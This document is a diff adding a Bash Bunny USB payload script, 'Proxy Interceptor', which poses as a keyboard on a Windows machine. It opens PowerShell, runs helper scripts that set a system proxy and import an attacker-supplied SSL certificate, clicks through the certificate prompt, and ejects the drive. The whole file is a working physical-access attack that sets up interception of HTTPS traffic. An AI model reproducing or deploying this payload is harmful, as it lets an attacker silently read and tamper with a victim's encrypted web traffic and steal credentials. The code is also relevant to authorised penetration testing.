@@ -1,0 +1,68 @@
+#!/bin/bash
+#
+# Title:         Proxy Interceptor
+# Author:        NightStalker
+# Version:       1.0
+#
+#This payload will enable a proxy and import an SSL certificate to a Windows
+#computer for Internet Explorer and Chrome (FireFox is in progress for 2.0)
+#The script uses a combination of Ducky Code and PowerShell.
+#
+# Set proxy and certificate varaibles in vars.ps1, certificate must be in same folder as payload.txt
+#
+# Red Blinking.............Running Payload
+# Purple Blinking .........Payload Completed
+
+#Set Red LED to indicate Starting of Script
+LED R 50
+
+#Set ATTACKMODE to HID and Storage to be able to transfer the certificate
+ATTACKMODE HID STORAGE
+
+
+LED SETUP
+GET SWITCH_POSITION
+
+LED ATTACK
+#Start of Script
+Q DELAY 6000
+Q GUI r
+Q DELAY 100
+Q STRING POWERSHELL
+Q ENTER
+Q DELAY 100
+
+#Change to the directory of the Bunny with the proper switch location
+Q STRING \$driveLetter = \(gwmi win32_volume -f \'label\=\'\'BashBunny\'\'\'\).Name
+Q ENTER
+Q STRING \$absPath = \$driveLetter\+\'payloads\\\'\+\'$SWITCH_POSITION\'\+\'\\\'
+Q ENTER
+Q STRING cd \$absPath
+Q ENTER
+Q DELAY 500
+
+LED ATTACK
+#Set the proxy in the internet settings in the registry (For IE and Chrome).
+Q STRING powershell -ExecutionPolicy RemoteSigned ".((gwmi win32_volume -f 'label=''BashBunny''').Name+'payloads\\$SWITCH_POSITION\SetProxy.ps1')"
+Q ENTER
+Q DELAY 500
+
+#Import the certificate to the computer (for IE and Chrome).
+Q STRING powershell -ExecutionPolicy RemoteSigned ".((gwmi win32_volume -f 'label=''BashBunny''').Name+'payloads\\$SWITCH_POSITION\ImportCert.ps1')"
+Q ENTER
+Q DELAY 1000
+Q ALT y
+Q DELAY 500
+
+#Unmount the USB Drive.
+Q STRING \$driveEject = New-Object -comObject Shell.Application
+Q ENTER
+Q STRING \$driveEject.Namespace\(17\).ParseName\(\"\$driveLetter\"\).InvokeVerb\(\"Eject\"\)
+Q ENTER
+Q DELAY 500
+Q ALT t
+Q DELAY 500
+Q STRING EXIT
+Q ENTER
+sync
+LED FINISH
